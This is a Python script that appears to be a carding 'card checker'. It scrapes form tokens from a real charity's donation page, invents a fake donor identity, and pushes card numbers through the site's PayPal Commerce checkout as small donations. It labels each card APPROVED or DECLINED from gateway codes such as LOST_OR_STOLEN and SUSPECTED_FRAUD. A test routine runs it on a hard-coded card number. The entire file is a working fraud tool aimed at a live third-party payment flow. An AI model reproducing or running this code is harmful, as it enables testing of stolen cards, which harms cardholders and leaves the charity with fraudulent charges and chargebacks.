import re, random, time, requests, base64
from requests_toolbelt.multipart.encoder import MultipartEncoder

def pp(ccx, amount="5.00", retry_count=1):

    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
    states = ["AL", "AK", "AZ", "AR", "CA", "CO", "CT", "DE", "FL", "GA", "HI", "ID", "IL", "IN", "IA", "KS", "KY", "LA", "ME", "MD", "MA", "MI", "MN", "MS", "MO", "MT", "NE", "NV", "NH", "NJ", "NM", "NY", "NC", "ND", "OH", "OK", "OR", "PA", "RI", "SC", "SD", "TN", "TX", "UT", "VT", "VA", "WA", "WV", "WI", "WY"]
    street_names = ["Main", "Oak", "Pine", "Maple", "Cedar", "Elm", "Washington", "Lake", "Hill", "Park"]
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    email = f"{first_name.lower()}{last_name.lower()}{random.randint(100, 999)}@gmail.com"
    phone = f"+1{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    street_number = random.randint(100, 9999)
    street_name = random.choice(street_names)
    street_type = random.choice(["St", "Ave", "Blvd", "Rd", "Ln"])
    street_address = f"{street_number} {street_name} {street_type}"
    street_address2 = f"{random.choice(['Apt', 'Unit', 'Suite'])} {random.randint(1, 999)}"
    city = random.choice(cities)
    state_abbr = random.choice(states)
    zip_code = f"{random.randint(10000, 99999)}"
    
    try:
        r = requests.session()
        r.verify = False
        
        headers = {
            'authority': 'osuawareness.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'referer': 'https://www.google.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        response = r.get('https://osuawareness.org/donation', headers=headers, timeout=20)
        
        if response.status_code != 200:
            return f"Site Error: {response.status_code}", "ERROR"
        
        ssa = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
        pro0 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
        ifr = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
        enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
        
        decoded_bytes = base64.b64decode(enc)
        dec = decoded_bytes.decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        
        headers = {
            'authority': 'tdcaustralia.com.au',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://osuawareness.org',
            'referer': 'https://osuawareness.org/donation',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': pro0,
            'give-form-id': ifr,
            'give-form-title': 'Donate for a Unit/Room at TDC Sahiwal Hospital',
            'give-current-url': 'https://osuawareness.org/donation',
            'give-form-url': 'https://osuawareness.org/donation',
            'give-form-minimum': amount,
            'give-form-maximum': '999999.99',
            'give-form-hash': ssa,
            'give-price-id': 'custom',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': amount,
            'give-recurring-period-donors-choice': 'month',
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_title': 'Mr.',
            'give_first': first_name,
            'give_last': last_name,
            'give_company_option': 'no',
            'give_company_name': '',
            'give_email': email,
            'give_comment': '',
            'give_phone': phone,
            'card_name': f'{first_name} {last_name}',
            'card_exp_month': '',
            'card_exp_year': '',
            'billing_country': 'US',
            'card_address': street_address2,
            'card_address_2': '',
            'card_city': city,
            'card_state': state_abbr,
            'card_zip': zip_code,
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        
        response = r.post('https://osuawareness.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data, timeout=20)
        
        multipart_data = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, pro0),
            'give-form-id': (None, ifr),
            'give-form-title': (None, 'Donate for a Unit/Room at TDC Sahiwal Hospital'),
            'give-current-url': (None, 'https://osuawareness.org/donation'),
            'give-form-url': (None, 'https://osuawareness.org/donation'),
            'give-form-minimum': (None, amount),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, ssa),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, amount),
            'give-recurring-period-donors-choice': (None, 'month'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_title': (None, 'Mr.'),
            'give_first': (None, first_name),
            'give_last': (None, last_name),
            'give_company_option': (None, 'no'),
            'give_company_name': (None, ''),
            'give_email': (None, email),
            'give_comment': (None, ''),
            'give_phone': (None, phone),
            'card_name': (None, f'{first_name} {last_name}'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'billing_country': (None, 'US'),
            'card_address': (None, street_address2),
            'card_address_2': (None, ''),
            'card_city': (None, city),
            'card_state': (None, state_abbr),
            'card_zip': (None, zip_code),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers = {
            'authority': 'osuawareness.org',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': multipart_data.content_type,
            'origin': 'https://osuawareness.org',
            'referer': 'https://osuawareness.org/donation',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        params = {
            'action': 'give_paypal_commerce_create_order',
        }
        
        response = r.post(
            'https://osuawareness.org/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            data=multipart_data,
            timeout=20,
        )
        
        id = response.json()['data']['id']
        
        headers = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'authorization': f'Bearer {au}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': f'{random.randint(1000000000000000, 9999999999999999):x}',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }
        
        response = requests.post(
            f'https://cors.api.paypal.com/v2/checkout/orders/{id}/confirm-payment-source',
            headers=headers,
            json=json_data,
            timeout=20
        )
        
        multipart_data2 = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, pro0),
            'give-form-id': (None, ifr),
            'give-form-title': (None, 'Donate for a Unit/Room at TDC Sahiwal Hospital'),
            'give-current-url': (None, 'https://osuawareness.org/donation'),
            'give-form-url': (None, 'https://osuawareness.org/donation'),
            'give-form-minimum': (None, amount),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, ssa),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, amount),
            'give-recurring-period-donors-choice': (None, 'month'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_title': (None, 'Mr.'),
            'give_first': (None, first_name),
            'give_last': (None, last_name),
            'give_company_option': (None, 'no'),
            'give_company_name': (None, ''),
            'give_email': (None, email),
            'give_comment': (None, ''),
            'give_phone': (None, phone),
            'card_name': (None, f'{first_name} {last_name}'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'billing_country': (None, 'US'),
            'card_address': (None, street_address2),
            'card_address_2': (None, ''),
            'card_city': (None, city),
            'card_state': (None, state_abbr),
            'card_zip': (None, zip_code),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers = {
            'authority': 'tdcaustralia.com.au',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': multipart_data2.content_type,
            'origin': 'https://osuawareness.org',
            'referer': 'https://osuawareness.org/donation',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        params = {
            'action': 'give_paypal_commerce_approve_order',
            'order': id,
        }
        
        response = r.post(
            'https://osuawareness.org/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            data=multipart_data2,
            timeout=20
        )
        
        text = response.text
        
        if 'true' in text:    
            return "Your order is ready.", "APPROVED"
        elif 'DO_NOT_HONOR' in text:
            return "DO_NOT_HONOR", "DECLINED"
        elif 'ACCOUNT_CLOSED' in text:
            return "ACCOUNT_CLOSED", "DECLINED"
        elif 'PAYEE_BLOCKED_TRANSACTION' in text:
            return "PAYEE_BLOCKED_TRANSACTION", "DECLINED"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return "PAYER_ACCOUNT_LOCKED_OR_CLOSED", "DECLINED"
        elif 'LOST_OR_STOLEN' in text:
            return "LOST_OR_STOLEN", "DECLINED"
        elif 'CVV2_FAILURE' in text:
            return "CVV2_FAILURE", "DECLINED"
        elif 'SUSPECTED_FRAUD' in text:
            return "SUSPECTED_FRAUD", "DECLINED"
        elif 'INVALID_ACCOUNT' in text:
            return "INVALID_ACCOUNT", "DECLINED"
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return "REATTEMPT_NOT_PERMITTED", "DECLINED"
        elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
            return "ACCOUNT_BLOCKED_BY_ISSUER", "DECLINED"
        elif 'ORDER_NOT_APPROVED' in text:
            return "ORDER_NOT_APPROVED", "DECLINED"
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return "PICKUP_CARD_SPECIAL_CONDITIONS", "DECLINED"
        elif 'PAYER_CANNOT_PAY' in text:
            return "PAYER_CANNOT_PAY", "DECLINED"
        elif 'INSUFFICIENT_FUNDS' in text:
            return "INSUFFICIENT_FUNDS", "DECLINED"
        elif 'GENERIC_DECLINE' in text:
            return "GENERIC_DECLINE", "DECLINED"
        elif 'COMPLIANCE_VIOLATION' in text:
            return "COMPLIANCE_VIOLATION", "DECLINED"
        elif 'TRANSACTION_NOT_PERMITTED' in text:
            return "TRANSACTION_NOT_PERMITTED", "DECLINED"
        elif 'PAYMENT_DENIED' in text:
            return "PAYMENT_DENIED", "DECLINED"
        elif 'INVALID_TRANSACTION' in text:
            return "INVALID_TRANSACTION", "DECLINED"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return "RESTRICTED_OR_INACTIVE_ACCOUNT", "DECLINED"
        elif 'SECURITY_VIOLATION' in text:
            return "SECURITY_VIOLATION", "DECLINED"
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return "DECLINED_DUE_TO_UPDATED_ACCOUNT", "DECLINED"
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return "INVALID_OR_RESTRICTED_CARD", "DECLINED"
        elif 'EXPIRED_CARD' in text:
            return "EXPIRED_CARD", "EXPIRED"
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return "CRYPTOGRAPHIC_FAILURE", "DECLINED"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return "TRANSACTION_CANNOT_BE_COMPLETED", "DECLINED"
        elif 'DECLINED_PLEASE_RETRY' in text:
            return "DECLINED_PLEASE_RETRY_LATER", "DECLINED"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return "TX_ATTEMPTS_EXCEED_LIMIT", "DECLINED"
        else:
            try:
                return response.json()['data']['error'], "DECLINED"
            except:
                return "UNKNOWN_ERROR", "ERROR"
            
    except requests.exceptions.Timeout:
        return "Connection Timeout", "ERROR"
    except requests.exceptions.ConnectionError:
        return "Connection Error", "ERROR"
    except Exception as e:
        return f"Error: {str(e)[:50]}", "ERROR"


def test_gateway():
    test_cc = "4100390673982381|04|27|601"
    print("🔍 Testing tdcaustralia.com.au gateway...")
    start = time.time()
    response, status = pp(test_cc, "20.00")
    elapsed = time.time() - start
    print(f"✅ Response: {response}")
    print(f"📊 Status: {status}")
    print(f"⏱️ Time: {elapsed:.2f} seconds")
    return response, status

if __name__ == "__main__":
    test_gateway()